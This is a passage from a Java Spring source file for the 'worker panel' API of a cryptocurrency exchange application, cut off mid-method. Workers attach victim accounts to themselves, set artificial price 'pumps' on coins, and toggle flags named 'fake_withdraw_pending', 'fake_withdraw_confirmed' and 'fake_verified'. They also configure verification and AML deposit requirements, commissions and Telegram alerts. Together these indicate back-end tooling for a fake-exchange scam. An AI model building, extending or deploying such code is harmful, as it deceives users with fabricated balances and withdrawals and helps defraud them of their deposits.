package me.yukitale.cryptoexchange.panel.worker.controller.api;

import me.yukitale.cryptoexchange.common.types.CoinType;
import me.yukitale.cryptoexchange.exchange.model.ban.EmailBan;
import me.yukitale.cryptoexchange.exchange.model.user.*;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserErrorMessage;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserRequiredDepositCoin;
import me.yukitale.cryptoexchange.exchange.repository.ban.EmailBanRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.*;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserErrorMessageRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserRequiredDepositCoinRepository;
import me.yukitale.cryptoexchange.exchange.security.service.UserDetailsServiceImpl;
import me.yukitale.cryptoexchange.exchange.security.xss.XSSUtils;
import me.yukitale.cryptoexchange.exchange.service.CooldownService;
import me.yukitale.cryptoexchange.exchange.service.UserService;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminLegalSettingsRepository;
import me.yukitale.cryptoexchange.panel.common.model.ErrorMessage;
import me.yukitale.cryptoexchange.panel.common.model.Feature;
import me.yukitale.cryptoexchange.panel.common.model.SmartDepositStep;
import me.yukitale.cryptoexchange.panel.common.types.HomePageDesign;
import me.yukitale.cryptoexchange.panel.common.types.KycAcceptTimer;
import me.yukitale.cryptoexchange.panel.worker.model.*;
import me.yukitale.cryptoexchange.panel.worker.model.settings.coins.WithdrawCoinLimit;
import me.yukitale.cryptoexchange.panel.worker.model.settings.coins.WorkerDepositCoin;
import me.yukitale.cryptoexchange.panel.worker.model.settings.other.*;
import me.yukitale.cryptoexchange.panel.worker.repository.*;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WithdrawCoinLimitRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WorkerCoinSettingsRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WorkerDepositCoinRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.other.*;
import me.yukitale.cryptoexchange.utils.DataValidator;
import me.yukitale.cryptoexchange.utils.JsonUtil;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import me.yukitale.cryptoexchange.config.Resources;
import me.yukitale.cryptoexchange.exchange.model.Coin;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserFeature;
import me.yukitale.cryptoexchange.exchange.repository.CoinRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserFeatureRepository;
import me.yukitale.cryptoexchange.exchange.service.EmailService;
import me.yukitale.cryptoexchange.panel.worker.service.WorkerService;
import me.yukitale.cryptoexchange.utils.FileUploadUtil;

import java.io.IOException;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

@RestController
@RequestMapping(value = "/api/worker-panel")
@PreAuthorize("hasRole('ROLE_WORKER')")
public class WorkerPanelApiController {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private FastPumpRepository fastPumpRepository;

    @Autowired
    private StablePumpRepository stablePumpRepository;

    @Autowired
    private WorkerErrorMessageRepository workerErrorMessageRepository;

    @Autowired
    private WorkerFeatureRepository workerFeatureRepository;

    @Autowired
    private AdminLegalSettingsRepository adminLegalSettingsRepository;

    @Autowired
    private WorkerSettingsRepository workerSettingsRepository;

    @Autowired
    private WorkerStakingPlanRepository workerStakingPlanRepository;

    @Autowired
    private WorkerSupportPresetsRepository workerSupportPresetsRepository;

    @Autowired
    private WorkerTelegramNotificationRepository workerTelegramNotificationRepository;

    @Autowired
    private WorkerDepositCoinRepository workerDepositCoinRepository;

    @Autowired
    private WorkerCoinSettingsRepository workerCoinSettingsRepository;

    @Autowired
    private WorkerRecordSettingsRepository workerRecordSettingsRepository;

    @Autowired
    private WithdrawCoinLimitRepository withdrawCoinLimitRepository;

    @Autowired
    private WorkerSmartDepositStepsRepository workerSmartDepositStepsRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private DomainRepository domainRepository;

    @Autowired
    private UserSupportMessageRepository userSupportMessageRepository;

    @Autowired
    private UserSupportDialogRepository userSupportDialogRepository;

    @Autowired
    private UserFeatureRepository userFeatureRepository;

    @Autowired
    private UserKycRepository userKycRepository;

    @Autowired
    private UserErrorMessageRepository userErrorMessageRepository;

    @Autowired
    private UserAlertRepository userAlertRepository;

    @Autowired
    private UserTransactionRepository userTransactionRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private UserRequiredDepositCoinRepository userRequiredDepositCoinRepository;

    @Autowired
    private EmailBanRepository emailBanRepository;

    @Autowired
    private UserService userService;

    @Autowired
    private WorkerService workerService;

    @Autowired
    private EmailService emailService;

    @Autowired
    private CooldownService cooldownService;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    //start binding
    @PostMapping(value = "/binding")
    public ResponseEntity<String> bindingController(Authentication authentication, @RequestBody Map<String, Object> data) {
        if (!data.containsKey("action")) {
            return ResponseEntity.badRequest().body("invalid_action");
        }
        String action = (String) data.get("action");
        switch (action) {
            case "BIND_BY_EMAIL" -> {
                return bindByEmail(authentication, data);
            }
            case "ADD_PROMOCODE" -> {
                return addPromocode(authentication, data);
            }
            case "DELETE_PROMOCODE" -> {
                return deletePromocode(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    //todo: caching
    private ResponseEntity<String> bindByEmail(Authentication authentication, Map<String, Object> data) {
        String email = (String) data.get("email");
        User user = userRepository.findByEmail(email.toLowerCase()).orElse(null);
        if (user == null || user.isStaff()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        if (user.getWorker() != null) {
            return ResponseEntity.badRequest().body("already_bind");
        }

        Worker worker = workerService.getWorker(authentication);

        userService.bindToWorker(user, worker);

        userRepository.save(user);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addPromocode(Authentication authentication, Map<String, Object> data) {
        String name = (String) data.get("promocode");
        if (!name.matches("^[a-zA-Z0-9-_]{2,32}$")) {
            return ResponseEntity.badRequest().body("invalid_promocode");
        }
        if (promocodeRepository.existsByNameIgnoreCase(name.toLowerCase())) {
            return ResponseEntity.badRequest().body("promocode_already_exists");
        }

        String symbol = (String) data.get("symbol");
        Optional<Coin> coinOptional = coinRepository.findBySymbol(symbol);
        if (coinOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("symbol_not_found");
        }
        String text = (String) data.get("text");
        if (!DataValidator.isTextValided(text) || text.length() > 512) {
            return ResponseEntity.badRequest().body("invalid_text");
        }

        double minAmount = data.get("amount").equals("false") || ((String) data.get("amount")).isEmpty() ? 0D : Double.parseDouble((String) data.get("amount"));
        double maxAmount = data.get("amount_2").equals("false") || ((String) data.get("amount_2")).isEmpty() ? minAmount : Double.parseDouble((String) data.get("amount_2"));
        double bonus = data.get("bonus").equals("false") || ((String) data.get("bonus")).isEmpty() ? 0D : Double.parseDouble((String) data.get("bonus"));

        if (minAmount <= 0 && maxAmount <= 0 && bonus <= 0) {
            return ResponseEntity.badRequest().body("invalid_amount");
        }

        if (minAmount > maxAmount) {
            return ResponseEntity.badRequest().body("invalid_min_amount");
        }

        Worker worker = workerService.getWorker(authentication);

        if (promocodeRepository.countByWorkerId(worker.getId()) > 50) {
            return ResponseEntity.badRequest().body("max_promocodes");
        }

        Promocode promocode = new Promocode(name, text, coinOptional.get(), minAmount, maxAmount, bonus, worker);
        promocodeRepository.save(promocode);

        return ResponseEntity.ok("success");
    }

    public ResponseEntity<String> deletePromocode(Authentication authentication, Map<String, Object> data) {
        long id = (long) (Integer) data.get("promocode_id");
        Worker worker = workerService.getWorker(authentication);

        if (!promocodeRepository.existsByIdAndWorkerId(id, worker.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        promocodeRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }
    //end binding

    //start pumps
    @PostMapping(value = "/pumps")
    public ResponseEntity<String> pumpsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        if (!data.containsKey("action")) {
            return ResponseEntity.badRequest().body("invalid_action");
        }
        String action = (String) data.get("action");
        switch (action) {
            case "FAST_PUMP_EDIT" -> {
                return fastPumpEdit(authentication, data);
            }
            case "FAST_PUMP_RESET" -> {
                return fastPumpReset(authentication, data);
            }
            case "STABLE_PUMP_EDIT" -> {
                return stablePumpEdit(authentication, data);
            }
            case "STABLE_PUMP_DELETE" -> {
                return stablePumpDelete(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    public ResponseEntity<String> fastPumpEdit(Authentication authentication, Map<String, Object> data) {
        String symbol = (String) data.get("symbol");
        Coin coin = coinRepository.findBySymbol(symbol).orElse(null);
        if (coin == null || coin.isStable()) {
            return ResponseEntity.badRequest().body("not_supported");
        }

        double percent = 0;
        try {
            percent = Double.parseDouble((String) data.get("percent")) / 100D;
        } catch (Exception ex) {
            return ResponseEntity.badRequest().body("percent");
        }

        Worker worker = workerService.getWorker(authentication);

        List<FastPump> fastPumps = fastPumpRepository.findAllByWorkerIdAndCoinSymbol(worker.getId(), coin.getSymbol());

        long nextPumpTime;
        if (!fastPumps.isEmpty()) {
            FastPump lastPump = fastPumps.get(fastPumps.size() - 1);
            if ((lastPump.getTime() - System.currentTimeMillis()) / 60000 > 15) {
                return ResponseEntity.badRequest().body("wait_old_klines");
            }

            nextPumpTime = lastPump.getTime() + 60000;
        } else {
            nextPumpTime = System.currentTimeMillis();
        }

        FastPump fastPump = new FastPump(coin, percent, nextPumpTime, worker);
        fastPumpRepository.save(fastPump);

        return ResponseEntity.ok("success");
    }

    public ResponseEntity<String> fastPumpReset(Authentication authentication, Map<String, Object> data) {
        long coinId = ((long) (int) data.get("coin_id"));
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null || coin.isStable()) {
            return ResponseEntity.badRequest().body("not_supported");
        }

        Worker worker = workerService.getWorker(authentication);
        if (!fastPumpRepository.existsByWorkerIdAndCoinSymbol(worker.getId(), coin.getSymbol())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        fastPumpRepository.deleteAllByWorkerIdAndCoinSymbol(worker.getId(), coin.getSymbol());

        return ResponseEntity.ok("success");
    }

    public ResponseEntity<String> stablePumpEdit(Authentication authentication, Map<String, Object> data) {
        String symbol = (String) data.get("symbol");
        Coin coin = coinRepository.findBySymbol(symbol).orElse(null);
        if (coin == null || coin.isStable()) {
            return ResponseEntity.badRequest().body("not_supported");
        }

        double percent = 0;
        try {
            percent = Double.parseDouble((String) data.get("percent")) / 100D;
        } catch (Exception ex) {
            return ResponseEntity.badRequest().body("percent");
        }

        Worker worker = workerService.getWorker(authentication);

        StablePump stablePump = stablePumpRepository.findByWorkerIdAndCoinSymbol(worker.getId(), coin.getSymbol()).orElse(null);
        if (stablePump != null) {
            stablePump.setPercent(percent);
        } else {
            stablePump = new StablePump(coin, percent, worker);
        }

        stablePumpRepository.save(stablePump);

        return ResponseEntity.ok("success");
    }

    public ResponseEntity<String> stablePumpDelete(Authentication authentication, Map<String, Object> data) {
        long id = (long) (int) data.get("pump_id");
        Worker worker = workerService.getWorker(authentication);
        StablePump stablePump = stablePumpRepository.findByWorkerIdAndId(worker.getId(), id).orElse(null);
        if (stablePump == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        stablePumpRepository.deleteByIdAndWorkerIdAndCoinSymbol(stablePump.getId(), worker.getId(), stablePump.getCoin().getSymbol());

        return ResponseEntity.ok("success");
    }
    //end pumps

    //start settings
    @PostMapping(value = "/settings")
    public ResponseEntity<String> settingsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        if (!data.containsKey("action")) {
            return ResponseEntity.badRequest().body("invalid_action");
        }
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_SUPPORT_SETTINGS" -> {
                return editSupportSettings(authentication, data);
            }
            case "EDIT_KYC_ACCEPT" -> {
                return editKycAccept(authentication, data);
            }
            case "EDIT_PROMO_SETTINGS" -> {
                return editPromoSettings(authentication, data);
            }
            case "EDIT_DEPOSIT_PAGE_SETTINGS" -> {
                return editDepositPageSettings(authentication, data);
            }
            case "ADD_STAKING_PLAN" -> {
                return addStakingPlan(authentication, data);
            }
            case "DELETE_STAKING_PLAN" -> {
                return deleteStakingPlan(authentication, data);
            }
            case "EDIT_FEATURES" -> {
                return editFeatures(authentication, data);
            }
            case "EDIT_TELEGRAM_SETTINGS" -> {
                return editTelegramSettings(authentication, data);
            }
            case "EDIT_P2P_PRICE" -> {
                return editP2PPrice(authentication, data);
            }
            case "EDIT_BONUS_SETTINGS" -> {
                return editBonusSettings(authentication, data);
            }
            case "ADD_RECORD_SETTINGS" -> {
                return addRecordSettings(authentication, data);
            }
            case "DELETE_RECORD_SETTINGS" -> {
                return deleteRecordSettings(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editSupportSettings(Authentication authentication, Map<String, Object> data) {
        String message = (String) data.get("message");
        boolean enabled = (boolean) data.get("enabled");
        if (enabled && StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker settings not found for worker " + worker.getUser().getEmail()));

        workerSettings.setSupportWelcomeMessage(XSSUtils.stripXSS(message));
        workerSettings.setSupportWelcomeEnabled(enabled);

        workerSettingsRepository.save(workerSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editKycAccept(Authentication authentication, Map<String, Object> data) {
        String type = String.valueOf(data.get("type"));
        KycAcceptTimer kycAcceptTimer = KycAcceptTimer.getByName("TIMER_" + type.toUpperCase());
        if (kycAcceptTimer == null) {
            return ResponseEntity.badRequest().body("error");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker settings not found for worker " + worker.getUser().getEmail()));

        workerSettings.setKycAcceptTimer(kycAcceptTimer);

        workerSettingsRepository.save(workerSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editPromoSettings(Authentication authentication, Map<String, Object> data) {
        boolean formEnabled = (boolean) data.get("form");
        boolean hideEnabled = (boolean) data.get("hide");

        Worker worker = workerService.getWorker(authentication);
        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker settings not found for worker " + worker.getUser().getEmail()));

        workerSettings.setPromoFormEnabled(formEnabled);
        workerSettings.setPromoHideEnabled(hideEnabled);

        workerSettingsRepository.save(workerSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editDepositPageSettings(Authentication authentication, Map<String, Object> data) {
        boolean showAddressAlwaysEnabled = (boolean) data.get("show_address_always_enabled");
        boolean showQrAlwaysEnabled = (boolean) data.get("show_qr_always_enabled");

        if (showQrAlwaysEnabled && !showAddressAlwaysEnabled) {
            return ResponseEntity.badRequest().body("qr_without_address");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker settings not found for worker " + worker.getUser().getEmail()));

        workerSettings.setShowAddressAlways(showAddressAlwaysEnabled);
        workerSettings.setShowQrAlways(showQrAlwaysEnabled);

        workerSettingsRepository.save(workerSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addStakingPlan(Authentication authentication, Map<String, Object> data) {
        String title = (String) data.get("title");
        if (StringUtils.isBlank(title)) {
            return ResponseEntity.badRequest().body("invalid_title");
        }
        int days = (int) data.get("days");
        if (days <= 0) {
            return ResponseEntity.badRequest().body("invalid_days");
        }
        double percent = (double) data.get("percent");
        if (Double.isNaN(percent) || percent <= 0) {
            return ResponseEntity.badRequest().body("invalid_percent");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerStakingPlan stakingPlan = new WorkerStakingPlan();
        stakingPlan.setTitle(title);
        stakingPlan.setDays(days);
        stakingPlan.setPercent(percent);
        stakingPlan.setWorker(worker);

        workerStakingPlanRepository.save(stakingPlan);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteStakingPlan(Authentication authentication, Map<String, Object> data) {
        long id = (long) (int) data.get("id");
        Worker worker = workerService.getWorker(authentication);
        if (!workerStakingPlanRepository.existsByIdAndWorkerId(id, worker.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        workerStakingPlanRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editFeatures(Authentication authentication, Map<String, Object> data) {
        Map<String, Boolean> featuresMap = (Map<String, Boolean>) data.get("features");
        Map<Feature.FeatureType, Boolean> features = new HashMap<>();
        for (Map.Entry<String, Boolean> entry : featuresMap.entrySet()) {
            features.put(Feature.FeatureType.valueOf(entry.getKey()), entry.getValue());
        }
        Worker worker = workerService.getWorker(authentication);
        List<WorkerFeature> workerFeatures = workerFeatureRepository.findAllByWorkerId(worker.getId());
        for (WorkerFeature workerFeature : workerFeatures) {
            workerFeature.setEnabled(features.getOrDefault(workerFeature.getType(), false));
            workerFeatureRepository.save(workerFeature);
        }

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "/settings/errors")
    public ResponseEntity<String> settingsErrorsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        Map<String, String> messagesMap = (Map<String, String>) data.get("messages");
        Map<ErrorMessage.ErrorMessageType, String> messages = new HashMap<>();
        for (Map.Entry<String, String> entry : messagesMap.entrySet()) {
            messages.put(ErrorMessage.ErrorMessageType.valueOf(entry.getKey()), entry.getValue());
        }
        Worker worker = workerService.getWorker(authentication);
        List<WorkerErrorMessage> errorMessages = workerErrorMessageRepository.findAllByWorkerId(worker.getId());
        for (WorkerErrorMessage errorMessage : errorMessages) {
            errorMessage.setMessage(XSSUtils.sanitize(messages.get(errorMessage.getType())));
            workerErrorMessageRepository.save(errorMessage);
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editTelegramSettings(Authentication authentication, Map<String, Object> data) {
        long telegramId = Long.parseLong(String.valueOf(data.get("telegram_id")));
        if (telegramId == 0) {
            return ResponseEntity.badRequest().body("id_error");
        }
        Map<String, Boolean> notificationsMap = (Map<String, Boolean>) data.get("notifications");
        Map<WorkerTelegramNotification.Type, Boolean> notifications = new HashMap<>();
        for (Map.Entry<String, Boolean> entry : notificationsMap.entrySet()) {
            notifications.put(WorkerTelegramNotification.Type.valueOf(entry.getKey()), entry.getValue());
        }
        Worker worker = workerService.getWorker(authentication);
        List<WorkerTelegramNotification> telegramNotifications = workerTelegramNotificationRepository.findAllByWorkerId(worker.getId());
        for (WorkerTelegramNotification telegramNotification : telegramNotifications) {
            telegramNotification.setEnabled(notifications.get(telegramNotification.getType()));
            workerTelegramNotificationRepository.save(telegramNotification);
        }

        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker settings not found for worker " + worker.getUser().getEmail()));
        workerSettings.setTelegramId(telegramId);

        workerSettingsRepository.save(workerSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editP2PPrice(Authentication authentication, Map<String, Object> data) {
        double price = getDoubleValue(data, "price");
        if (Double.isNaN(price) || price < 0) {
            return ResponseEntity.badRequest().body("price_error");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker settings not found for worker " + worker.getUser().getEmail()));
        workerSettings.setP2pOverPrice(price);

        workerSettingsRepository.save(workerSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editBonusSettings(Authentication authentication, Map<String, Object> data) {
        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        String text = (String) data.get("text");
        if (StringUtils.isBlank(text)) {
            return ResponseEntity.badRequest().body("text_error");
        }

        long coinId = (long) (int) data.get("coin");
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_error");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker settings not found for worker " + worker.getUser().getEmail()));
        workerSettings.setBonusAmount(amount);
        workerSettings.setBonusCoin(coin);
        workerSettings.setBonusText(XSSUtils.sanitize(text));

        workerSettingsRepository.save(workerSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addRecordSettings(Authentication authentication, Map<String, Object> data) {
        boolean fakeWithdrawPending = Boolean.parseBoolean(String.valueOf(data.get("fake_withdraw_pending")));
        boolean fakeWithdrawConfirmed = Boolean.parseBoolean(String.valueOf(data.get("fake_withdraw_confirmed")));
        boolean premium = Boolean.parseBoolean(String.valueOf(data.get("premium")));
        boolean walletConnect = Boolean.parseBoolean(String.valueOf(data.get("wallet_connect")));
        boolean fakeVerified = Boolean.parseBoolean(String.valueOf(data.get("fake_verified")));

        if (!fakeWithdrawPending && !fakeWithdrawConfirmed && !premium && !walletConnect && !fakeVerified) {
            return ResponseEntity.badRequest().body("no_settings");
        }

        if (fakeWithdrawPending && fakeWithdrawConfirmed) {
            return ResponseEntity.badRequest().body("fake_withdraw");
        }

        Worker worker = workerService.getWorker(authentication);
        if (workerRecordSettingsRepository.countByWorkerId(worker.getId()) >= 3) {
            return ResponseEntity.badRequest().body("limit");
        }

        long emailEnd = ThreadLocalRandom.current().nextLong(100_000, 999_999);
        if (workerRecordSettingsRepository.existsByEmailEnd(emailEnd)) {
            return ResponseEntity.badRequest().body("error");
        }

        WorkerRecordSettings workerRecordSettings = new WorkerRecordSettings();
        workerRecordSettings.setWorker(worker);
        workerRecordSettings.setEmailEnd(emailEnd);
        workerRecordSettings.setFakeWithdrawPending(fakeWithdrawPending);
        workerRecordSettings.setFakeWithdrawConfirmed(fakeWithdrawConfirmed);
        workerRecordSettings.setPremium(premium);
        workerRecordSettings.setWalletConnect(walletConnect);
        workerRecordSettings.setFakeVerified(fakeVerified);

        workerRecordSettingsRepository.save(workerRecordSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteRecordSettings(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));

        WorkerRecordSettings workerRecordSettings = workerRecordSettingsRepository.findById(id).orElse(null);
        if (workerRecordSettings == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        workerRecordSettingsRepository.deleteByIdAndEmailEnd(id, workerRecordSettings.getEmailEnd());

        return ResponseEntity.ok("success");
    }
    //end settings

    //start coins
    @PostMapping(value = "/coins")
    public ResponseEntity<String> coinsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_DEPOSIT_COINS" -> {
                return editDepositCoins(authentication, data);
            }
            case "EDIT_MIN_DEPOSIT" -> {
                return editMinDeposit(authentication, data);
            }
            case "EDIT_TRANSACTION_COMMISSIONS" -> {
                return editDepositCommission(authentication, data);
            }
            case "EDIT_VERIFICATION_REQUIREMENT" -> {
                return editVerificationRequirement(authentication, data);
            }
            case "EDIT_VERIFICATION_AML" -> {
                return editVerificationAml(authentication, data);
            }
            case "EDIT_MIN_VERIF" -> {
                return editMinVerif(authentication, data);
            }
            case "EDIT_MIN_WITHDRAW" -> {
                return editMinWithdraw(authentication, data);
            }
            case "ADD_WITHDRAW_COIN_LIMIT" -> {
                return addWithdrawCoinLimit(authentication, data);
            }
            case "DELETE_WITHDRAW_COIN_LIMIT" -> {
                return deleteWithdrawCoinLimit(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editDepositCoins(Authentication authentication, Map<String, Object> data) {
        List<Map<String, Object>> coins = (List<Map<String, Object>>) data.get("coins");

        boolean useBtcVerifDeposit = (boolean) data.get("use_btc_verif_deposit");

        for (Map<String, Object> coin : coins) {
            String title = (String) coin.get("title");
            if (StringUtils.isBlank(title)) {
                return ResponseEntity.badRequest().body("title_is_empty");
            }
            if (!title.matches("[a-zA-Z0-9 _-]+")) {
                return ResponseEntity.badRequest().body("title_error");
            }

            double minDepositAmount = coin.get("min_deposit_amount") == null ? -1D : Double.parseDouble(String.valueOf(coin.get("min_deposit_amount")));
            if (minDepositAmount != -1 && minDepositAmount <= 0) {
                return ResponseEntity.badRequest().body("min_deposit_amount_error");
            }

            double verifDepositAmount = coin.get("verif_deposit_amount") == null ? 0D : Double.parseDouble(String.valueOf(coin.get("verif_deposit_amount")));
            if (verifDepositAmount < 0) {
                verifDepositAmount = 0;
            }
        }

        Map<Long, Map<String, Object>> coinMap = new HashMap<>();
        for (Map<String, Object> coin : coins) {
            coinMap.put((long) (int) coin.get("id"), coin);
        }

        Worker worker = workerService.getWorker(authentication);
        List<WorkerDepositCoin> coinList = workerDepositCoinRepository.findAllByWorkerId(worker.getId());
        for (WorkerDepositCoin depositCoin : coinList) {
            Map<String, Object> coin = coinMap.get(depositCoin.getId());
            if (coin == null) {
                continue;
            }

            String title = (String) coin.get("title");
            double minDepositAmount = coin.get("min_deposit_amount") == null ? -1D : Double.parseDouble(String.valueOf(coin.get("min_deposit_amount")));
            double verifDepositAmount = coin.get("verif_deposit_amount") == null ? 0D : Double.parseDouble(String.valueOf(coin.get("verif_deposit_amount")));
            boolean enabled = (boolean) coin.get("enabled");

            if (useBtcVerifDeposit && verifDepositAmount <= 0 && depositCoin.getType() == CoinType.BTC) {
                return ResponseEntity.badRequest().body("use_btc_verif_deposit");
            }

            if (!depositCoin.getTitle().equals(title) || depositCoin.getMinDepositAmount() != minDepositAmount || depositCoin.isEnabled() != enabled || depositCoin.getVerifDepositAmount() != verifDepositAmount) {
                depositCoin.setTitle(title);
                depositCoin.setMinDepositAmount(minDepositAmount);
                depositCoin.setVerifDepositAmount(verifDepositAmount);
                depositCoin.setEnabled(enabled);

                workerDepositCoinRepository.save(depositCoin);
            }
        }

        WorkerCoinSettings workerCoinSettings = worker.getCoinSettings();
        if (workerCoinSettings.isUseBtcVerifDeposit() != useBtcVerifDeposit) {
            workerCoinSettings.setUseBtcVerifDeposit(useBtcVerifDeposit);

            workerCoinSettingsRepository.save(workerCoinSettings);
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editMinDeposit(Authentication authentication, Map<String, Object> data) {
        double minDepositAmount = getDoubleValue(data, "min_deposit_amount");
        if (Double.isNaN(minDepositAmount) || minDepositAmount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerCoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker coin settings not found for worker " + worker.getUser().getEmail()));

        coinSettings.setMinDepositAmount(minDepositAmount);

        workerCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editDepositCommission(Authentication authentication, Map<String, Object> data) {
        double depositCommission = getDoubleValue(data, "deposit_commission");
        double withdrawCommission = getDoubleValue(data, "withdraw_commission");
        if (Double.isNaN(depositCommission) || depositCommission < 0 || depositCommission >= 100 ||
                Double.isNaN(withdrawCommission) || withdrawCommission < 0 || withdrawCommission >= 100) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerCoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker coin settings not found for worker " + worker.getUser().getEmail()));

        coinSettings.setDepositCommission(depositCommission);
        coinSettings.setWithdrawCommission(withdrawCommission);

        workerCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editVerificationRequirement(Authentication authentication, Map<String, Object> data) {
        boolean enabled = (boolean) data.getOrDefault("enabled", false);

        Worker worker = workerService.getWorker(authentication);
        WorkerCoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker coin settings not found for worker " + worker.getUser().getEmail()));

        coinSettings.setVerifRequirement(enabled);

        workerCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editVerificationAml(Authentication authentication, Map<String, Object> data) {
        boolean enabled = (boolean) data.getOrDefault("enabled", false);

        Worker worker = workerService.getWorker(authentication);
        WorkerCoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker coin settings not found for worker " + worker.getUser().getEmail()));

        coinSettings.setVerifAml(enabled);

        workerCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editMinVerif(Authentication authentication, Map<String, Object> data) {
        double minVerifAmount = getDoubleValue(data, "min_verif_amount");
        if (Double.isNaN(minVerifAmount) || minVerifAmount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerCoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker coin settings not found for worker " + worker.getUser().getEmail()));

        coinSettings.setMinVerifAmount(minVerifAmount);

        workerCoinSettingsRepository.save(coinSettings);

